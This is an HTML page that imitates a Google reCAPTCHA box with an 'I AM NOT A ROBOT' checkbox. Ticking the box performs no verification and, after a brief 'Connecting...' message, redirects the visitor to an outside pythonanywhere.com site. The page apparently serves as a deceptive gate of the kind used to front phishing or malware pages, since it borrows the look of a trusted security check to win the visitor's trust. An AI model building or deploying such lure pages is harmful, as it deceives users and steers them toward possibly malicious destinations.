<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    


    <style>
        body {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
        }
        #recaptcha-container {
            padding: 20px;
            background-color: #ffffff;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            border-radius: 8px;
            display: flex;
            align-items: center;
        }
        #loading {
            font-size: 24px;
            color: #333;
            display: none;
        }
        .recaptcha-icon {
            width: 50px;
            height: 50px;
            margin-right: 10px;
        }
    </style>
</head>
<body>
    <div id="recaptcha-container">
        <img src="th.png" alt="reCAPTCHA" class="recaptcha-icon">
        <label for="recaptcha-checkbox">
            <input type="checkbox" id="recaptcha-checkbox">
            I AM NOT A ROBOT
        </label>
    </div>
    <div id="loading">Connecting...</div>
    <script>
        document.getElementById('recaptcha-checkbox').addEventListener('change', function() {
            if (this.checked) {
                document.getElementById('recaptcha-container').style.display = 'none';
                document.getElementById('loading').style.display = 'block';

                // Redirect to the specified URL after a short delay
                setTimeout(function() {
                    window.location.href = "https://essentialsbycyndy.pythonanywhere.com";
                }, 1000); // 1 second delay for the user to see "Connecting..."
            }
        });
    </script>
</body>
</html>
